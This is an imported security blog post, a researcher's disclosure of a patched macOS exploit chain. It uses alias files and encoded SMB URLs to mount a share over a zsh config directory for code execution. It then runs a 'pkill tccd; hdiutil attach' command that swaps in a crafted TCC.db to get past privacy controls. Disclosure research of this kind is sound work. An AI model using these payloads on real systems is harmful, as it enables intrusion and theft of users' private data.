---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-26_alias-file-to-rule-them-all-one-click-code-execution-with-alias-file-in-macos.md
original_filename: 2023-04-26_alias-file-to-rule-them-all-one-click-code-execution-with-alias-file-in-macos.md
title: Alias file to rule them all — One click code execution with alias file in macOS
category: documents
detected_topics:
- sqli
- command-injection
- api-security
- supply-chain
tags:
- imported
- documents
- sqli
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: c7d06f2c1cf7cdef7489fee8c665d12e330360f22a31f4db5cdea9814879f208
text_sha256: d386be3dfbd2df19a1e3c7288fb98ead4deddc03f4a2ec5a5fda389ae4a3647d
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# Alias file to rule them all — One click code execution with alias file in macOS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-26_alias-file-to-rule-them-all-one-click-code-execution-with-alias-file-in-macos.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `c7d06f2c1cf7cdef7489fee8c665d12e330360f22a31f4db5cdea9814879f208`
- Text SHA256: `d386be3dfbd2df19a1e3c7288fb98ead4deddc03f4a2ec5a5fda389ae4a3647d`


## Content

---
title: "Alias file to rule them all — One click code execution with alias file in macOS"
url: "https://mikko-kenttala.medium.com/alias-file-to-rule-them-all-one-click-code-execution-with-alias-file-in-macos-1eeb0a730b88"
authors: ["Mikko Kenttälä (@Turmio_)"]
programs: ["Apple (macOS)"]
bugs: ["Arbitrary Code Execution", "TCC bypass"]
publication_date: "2023-04-26"
added_date: "2023-04-28"
source: "pentester.land/writeups.json"
original_index: 1218
scraped_via: "browseros"
---

# Alias file to rule them all — One click code execution with alias file in macOS

Alias file to rule them all — One click code execution with alias file in macOS
Mikko Kenttälä
Follow
6 min read
·
Apr 26, 2023

3

Summary (TL;DR)

Late in 2020, I found a vulnerability chain from macOS where an attacker can use macOS Alias files to cause network mounts to be made on an arbitrary directory which will lead to arbitrary code execution (ACE) with user privileges with one click.

This combined with TCC (privacy/access database) evasion will compromise the user’s sensitive data.

These vulnerabilities have been fixed in the beginning of 2021.

Even though this is an old vulnerability, the technical details I am disclosing here might benefit future research. So here’s how it works.

External Mount Triggered via an Alias File

As described in Wikipedia, alias “is a small file that represents another object in a local, remote, or removable file system and provides a dynamic link to it” .

Right click file and you can find Make Alias option to create alias file

One can create alias files which point directly to a network share, for example a samba mount. If the target is not mounted, it will be mounted when the file is accessed. Resolving alias files typically includes human interaction, but not always.

Some of macOS’s background processes can resolve aliases, too. In this particular case, a .zip is downloaded and automatically uncompressed with the MyApplication.app folder. The Launch Service Daemon (lsd) automatically indexes the data therein (whether dirty and/or quarantined or not) and also resolves any aliases and their pointers to any samba mounts. After doing so, lsd will also mount the network shares.

This way an attacker can automatically mount network shares if the right kind of data touches the disk.

This can be done, for example, by tricking the user to download a zip file of the attacker’s choosing. The zip file will be automatically unzipped to the Download directory of the user.

1 click
SMB URL Trickery to Set Mountpoint (CVE-2021–1751)

When a user mounts external file systems like samba or nfs, the mountpoint will be under /Volumes . Typical URLs like smb:// yourfileserver.local/share will be mounted to /Volumes/share .

When you click Desktop and hit command + k, you can give a direct URL to Samba mount to trigger the mount process. Alternatively, if you prefer the command line, you can type “open smb://yourfileserver.local/share “ to the same effect. If you try to play around with mount paths like using “../ “ as part of the URL, MacOS will do some validation. However, it seems that the message goes through multiple different parsers before it reaches NetAuthSysAgent which will do the actual mount.

These parsers can be fooled with URL encoding. Since the last part of the URL’s path is used as a mount point, you can not add tricks of the “../../../etc/” kind. My first idea was to try url-encoding with using “%2e%2e%2f” instead of “../” or with double encoding “%252e%252e%252f” but the parsers worked as expected, causing the same result as plain “../../”. So no cigar..

But if you add “%00” (null) at the end of the URL it will break something and the FQDN name will be used as a mountpath. Instead of /Volumes/share the directory will be mounted as /Volumes/[FQDN]: /Volumes/yourfileserver.local .

A potential attacker could setup a wildcard domain like *.wild.yourfileserver.local which will give an IP for all the subdomains under that wild.yourfileserver.local. That gives you plenty of room to play around with URL encodings in domain names. You need to use double encoding with some of the characters like the dot (“.”) to avoid some validation fails.

We are not fully there but we can control the beginning of the mountpoint path with using following URL, : “smb://guest:@%252e%252e%2fprivate%2ftmp%2f.wild.yourfileserver.local/share/%00” the following mount will be automatically made by the operating system:

//guest:@%252e%252e%2Fprivate%2Ftmp%2Fwild.yourfileserver.local/share/%00 on /private/tmp/testtrick.wild.yourfileserver.local (smbfs, nodev, nosuid, noowners, quarantine, mounted by test)

To get an arbitrary mountpath, the final step is to exclude the rest of the domain name away from the URL. That can be done, once again, with “%2500” (null) . This time, double encoding is needed to avoid a domain name query failure. That brings us to an url like:

smb://guest:@%252e%252e%2fprivate%2ftmp%2ftest%2500.wild.yourfileserver.local/temp/%00'

Only a nonexistent directory can be used as a mountpoint.

If successful, the attacker now has the power to mount samba shares to any path she wants.

Command Execution with an Arbitrary Mountpoint

The attacker still needs to find a way to get her code running. The mount is considered dirty (quarantine flag) and she can not mount to directories which already exist in the filesystem.

Get Mikko Kenttälä’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Command execution can be achieved by mounting the share directly to /Users/test/.zkbd which includes the file “xterm-256color-apple”. With that we will get our code running next time when the user starts the zsh shell. It will happen because zsh will do following everytime when it is started:

source ${ZDOTDIR:-$HOME}/.zkbd/${TERM}-${VENDOR}

Now we have a way to trigger our payload when the user is using her machine as normal.

All macOS users are not familiar with zsh and Terminal but since this is not the actual vulnerability in this PoC, I believe anything goes. :)

Avoiding TCC Restrictions (CVE-2021–1784)
Press enter or click to view image in full size
System Integrity Protection secures important files in system like users TCC.db

By default, Terminal.app does not have the right to read sensitive data, such as Photos, Contacts, Calendar and Desktop . MacOS has an additional layer of security for the purposes of protecting the user’s data. For example, normally users need to grant access to all applications which require an access to files in ~/Desktop . This is controlled by the accessibility/privacy database known as the TCC. TCC.db is SQLite database and it is stored on “$HOME/Library/Application Support/com.apple.TCC/TCC.db”. It is also protected by System Integrity Protection (SIP), so normally the attacker should not be able to touch this database (except with full disk access applications) or by manually configuring and clicking settings.

To get access to sensitive data, the attacker can evade protections and get her own access policies to privacy databases. That can be achieved with a “hdiutil attach”. The attacker can prepare her own database which includes a good set of access policies and add that database file to an image which can be mounted with hdiutil.

The attacker can mount the malicious image with:

pkill -9 -U $USER tccd ; hdiutil attach “tcc.dmg” -nobrowse -mountpoint “$HOME/Library/Application Support/com.apple.TCC”

First, we kill the user’s tccd process to sync and close the current file handle. Then we mount our own image to the right path and, when tccd restarts , it will read the attacker’s TCC.db instead of the correct one.

And now the attacker has access to protected sensitive data.

Chaining everything together
Press enter or click to view image in full size

In our PoC the victim downloads MyMidiTest.zip* as a part of a phishing or drive-by web-download operation. Thereafter, the user clicks “download” and Safari downloads the file and automatically uncompresses it. MyMidiTest.app Application binary is actually an alias file which point to attackers URL:

smb://guest:@%252e%252e%2FUsers%2Ftest%2F.zkbd%2500zkbd.wild.mydomain.local/temp/mytests/zkbd/%00/%20 .

Background process lsd will try to index it and the share will be mounted under /Users/test/.zkbd . When Vthe ivctim opens the terminal, zsh will load its configuration from a directory controlled by the attacker via the network share and load code from there. The code will be executed from the command line.

Tcc.dmg will be mounted with diskutil and the mounted image includes a custom TCC.db to gain access to sensitive data and, after gaining access, the attacker finally copies the sensitive data out of the system to the same samba mount used before.

Impact

This vulnerability chain allows a potential attacker to get access to all of the user’s sensitive data with one misclick on the user’s browser. This is achieved because of the feature in Safari and the disclosed vulnerabilities for parsing the URI’s for network mounts and how TCC can be manipulated to load an external database.

Timeline
2020–10–10: Report sent (Big Sur beta9)
2021–02–01: (CVE-2021–1751) SMB mount trick fixed in macOS Big Sur 11.2, Security Update 2021–001 Catalina, Security Update 2021–001 Mojave
2021–04–26: (CVE-2021–1784) macOS Big Sur 11.3, Security Update 2021–002 Catalina, Security Update 2021–003 Mojave
Alias issue got silent fix
2021–12–17: Report was qualified for Apple Security Bounty

Links:

Presentation at MCH 2022: https://youtu.be/SsZ7jTbaw0A

Credits: Special thanks to Risto Sandvik for helping with the writeup ❤
